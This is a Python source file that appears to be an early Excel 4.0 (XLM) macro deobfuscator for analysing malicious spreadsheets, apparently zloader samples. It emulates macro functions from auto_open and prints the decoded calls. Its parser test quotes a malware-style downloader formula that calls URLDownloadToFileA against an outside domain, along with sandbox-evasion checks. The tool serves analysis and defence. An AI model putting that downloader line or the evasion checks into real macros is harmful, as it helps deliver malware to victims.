from win32com.client import Dispatch
import re
import os
from lark import Lark
from lark.lexer import Token
from utils import *
from xlm_wrapper import XLMWrapper
from xlsm_wrapper import XLSMWrapper


class XLMInterpreter:
    def __init__(self, XLMWrapper):
        self.XLMWrapper = XLMWrapper
        self.cell_addr_regex_str = r"((?P<sheetname>[^\s]+?|'.+?')!)?\$?(?P<column>[a-zA-Z]+)\$?(?P<row>\d+)"
        self.cell_addr_regex = re.compile(self.cell_addr_regex_str)
        macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
        self.xlm_parser = Lark(macro_grammar)

    def parse_cell_address(self, cell_addr):
        sheet_name = None
        row = None
        col = None
        absolute_addr = True
        res = self.cell_addr_regex.match(cell_addr)
        sheet_name = res['sheetname'] if 'sheetname' in res.re.groupindex else None
        col = res['column'] if 'column' in res.re.groupindex else None
        row = res['row'] if 'row' in res.re.groupindex else None
        return sheet_name, col, int(row)

    def get_cell(self, macrosheet, col, row):
        result = None
        current_row = row
        not_found = False

        while (col + str(current_row)) not in macrosheet['cells']:
            if (current_row - row) < 50:
                current_row += 1
            else:
                not_found = True
                break

        if not_found is False:
            cell_addr = col + str(current_row)
            result = macrosheet['cells'][cell_addr]

        return col, current_row, result

    def get_next_cell(self, macrosheet, cur_col, cur_row):
        return self.get_cell(macrosheet, cur_col, cur_row+1)

    def get_argument_length(self, arglist_node):
        result = None
        if arglist_node.data == 'arglist':
            result = len(arglist_node.children)
        return result

    def get_cell_addr(self, sheet, col, row, cell_parse_tree):
        result = None
        cell = cell_parse_tree.children[0]
        if cell.data == 'absolute_cell':
            res_sheet, res_col, res_row = self.parse_cell_address(cell.children[0])
            if res_sheet is None:
                res_sheet = sheet
        elif cell.data == 'relative_cell':
            raise Exception('Not implemented')
        else:
            raise Exception('Cell addresss, Syntax Error')

        return res_sheet, res_col, res_row

    def get_cell_value(self, macros, sheet, cell_parse_tree):
        result = None
        cell = cell_parse_tree.children[0]
        if cell.data == 'absolute_cell':
            sheet_name, col, row = self.parse_cell_address(cell.children[0])
            if sheet_name is None:
                sheet_name = sheet
            result = macros[sheet_name]['cells'][col+str(row)]
        elif cell.data == 'relative_cell':
            raise Exception('Not implemented')
        else:
            raise Exception('Cell addresss, Syntax Error')

        return result

    def evaluate_parse_tree(self, macros, current_sheet_name, col, row, parse_tree_root):

        next_sheet = current_sheet_name
        next_col = col
        next_row = row
        text = None
        raw = macros[current_sheet_name]['cells'][col+str(row)]['formula']
        if type(parse_tree_root) is Token:
            text = str(parse_tree_root)
        elif parse_tree_root.data == 'function_call':
            function_name = parse_tree_root.children[0]
            function_arguments = parse_tree_root.children[1]
            size = self.get_argument_length(function_arguments)
            if function_name == 'RUN':
                if size == 1:
                    next_sheet, next_col, next_row = self.get_cell_addr(current_sheet_name, col, row, function_arguments.children[0].children[0])
                    text='RUN({}!{}{})'.format(next_sheet, next_col, next_row)
                elif size == 2:
                    raise Exception('RUN(reference, step) is not implemented')
                else:
                    raise Exception('RUN() is incorrect')
            elif function_name == 'CHAR':
                next_sheet, next_col, next_row, text = self.evaluate_parse_tree(macros, current_sheet_name, col, row, function_arguments.children[0])
                text = chr(int(text))
                cell_col,cell_row, cell = self.get_cell(macros[current_sheet_name], col, row)
                cell['value'] = text
                next_row += 1
            elif function_name == 'FORMULA':
                first_arg = function_arguments.children[0]
                next_sheet, next_col, next_row, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                     row, first_arg)
                second_arg = function_arguments.children[1].children[0]
                res_sheet, res_col, res_row = self.get_cell_addr(current_sheet_name,col,row, second_arg)
                macros[res_sheet]['cells'][res_col+str(res_row)] = {'formula':None, 'value':text}
                next_row += 1
                print(raw)
                print("FORMULA('{}',{})".format(text, '{}!{}{}'.format(res_sheet,res_col,res_row)))
                text = 'FORMULA'
            elif function_name == 'CALL':
                arguments = []
                for argument in function_arguments.children:
                    next_sheet, next_col, next_row, text = self.evaluate_parse_tree(macros, current_sheet_name, col,
                                                                                    row, argument)
                    arguments.append(text)
                print(raw)
                print('CALL({})'.format(','.join(arguments)))
                next_row += 1
                text = 'CALL'
            elif function_name == 'HALT':
                next_row = None
                next_col = None
                next_sheet = None
                text = 'HALT'
            else:
                t = 10

        elif parse_tree_root.data == 'method_call':
            t =11
        elif parse_tree_root.data == 'cell':
            text = self.get_cell_value(macros, current_sheet_name, parse_tree_root)['value']
        elif parse_tree_root.data == 'binary_expression':
            left_arg = parse_tree_root.children[0]
            next_sheet, next_col, next_row, text_left = self.evaluate_parse_tree(macros, current_sheet_name, col, row, left_arg)
            operator = str(parse_tree_root.children[1].children[0])
            right_arg = parse_tree_root.children[2]
            next_sheet, next_col, next_row, text_right = self.evaluate_parse_tree(macros, current_sheet_name, col, row, right_arg)
            if operator == '-':
                text = str(int(text_left) - int(text_right))
            elif operator == '+':
                text = str(int(text_left) + int(text_right))
            elif operator == '*':
                text = str(int(text_left) * int(text_right))
            elif operator == '&':
                text = text_left+text_right
            else:
                raise Exception('Not implemented')
        elif parse_tree_root.data == 'binary_operator':
            t = 10
        else:
            for child_node in parse_tree_root.children:
                if child_node is not None:
                    next_sheet, next_col, next_row, text = self.evaluate_parse_tree(macros, current_sheet_name, col, row, child_node)

        return next_sheet, next_col, next_row, text

    def interpret_cell(self, macros, current_sheetname, col, row, cell):
        next_sheet = None
        next_col= None
        next_row = None
        cell_addr = None
        text = None
        if cell['formula'] is not None:
            parse_tree = self.xlm_parser.parse(cell['formula'])
            next_sheet, next_col, next_row, text = self.evaluate_parse_tree(macros, current_sheetname, col, row, parse_tree)

        return next_sheet, next_col, next_row, text

    def deobfuscate_macro(self):
        result = []
        auto_open = self.XLMWrapper.get_defined_name('auto_open')
        sheetname, col, row = self.parse_cell_address(auto_open)
        macros = self.XLMWrapper.get_xlm_macros()
        current_col, current_row, current_cell = self.get_cell(macros[sheetname], col, row)
        if current_cell is not None:
            while True:
                next_sheet, next_col, next_row, text = self.interpret_cell(macros, sheetname, current_col, current_row, current_cell)
                if text is not None:
                    result.append((sheetname, current_col, current_row, text))
                if next_sheet is not None:
                    current_col, current_row, current_cell = self.get_cell(macros[next_sheet], next_col, next_row)
                    sheetname = next_sheet
                else:
                    break
        return result



def interpret_char_function(line):
    char_replace_res = line
    exist = False
    if 'FORMULA' not in line:
        char_replace_res = char_replace_res.replace('&', '')
        regex_char = "CHAR\((?P<number>\d{,3})\)"

        regex_char_compiled = re.compile(regex_char, re.MULTILINE)

        matches = regex_char_compiled.finditer(line)

        for matchNum, match in enumerate(matches, start=1):
            exist = True
            character = chr(int(match['number']))
            start = match.regs[match.pos][0]
            end = match.regs[match.pos][1]
            char_replace_res = char_replace_res.replace(match.string[start:end], character)

    return exist, char_replace_res


def interpret_formula_function(line, cells):
    regex_formula = "FORMULA\((?P<arg1>[^,]+),(?P<arg2>[^\)]+)\)"
    exist = False
    matches = re.finditer(regex_formula, line, re.MULTILINE)
    result = line[1:]
    for matchNum, match in enumerate(matches, start=1):
        exist = True
        arg1 = match['arg1']
        params = arg1.split('&')
        start = match.regs[match.pos][0]
        end = match.regs[match.pos][1]

        tmp = ''
        for param in params:
            absolute_name = param.replace('$', '')
            if absolute_name in cells:
                tmp += cells[absolute_name][1:]
            else:
                tmp += param

        result = result.replace(match.string[start:end], tmp)

    return exist, result


def test_parser():
    macro_grammar = open('xlm-macro.lark', 'r', encoding='utf_8').read()
    xlm_parser = Lark(macro_grammar)

    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
    print("\n=RUN($DC$240)")
    print(xlm_parser.parse("=RUN($DC$240)"))
    print("\n=CHAR($IE$1109-308)")
    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
    print("\n=HALT()")
    print(xlm_parser.parse("=HALT()"))
    print('\n=WAIT(NOW()+"00:00:03")')
    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
    print(
        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
    print(xlm_parser.parse(
        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))


if __name__ == '__main__':

    # excel = Dispatch("Excel.Application")
    # wb = excel.Workbooks.Open(os.path.join(zloader_samples_dir, excel_file))
    # macrosheet = get_entry_macrosheet(wb)

    path = r"C:\Users\user\Downloads\samples\analyze\01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606.xlsm"
    xlsm_doc = XLSMWrapper(path)
    interpreter = XLMInterpreter(xlsm_doc)
    interpreter.deobfuscate_macro()
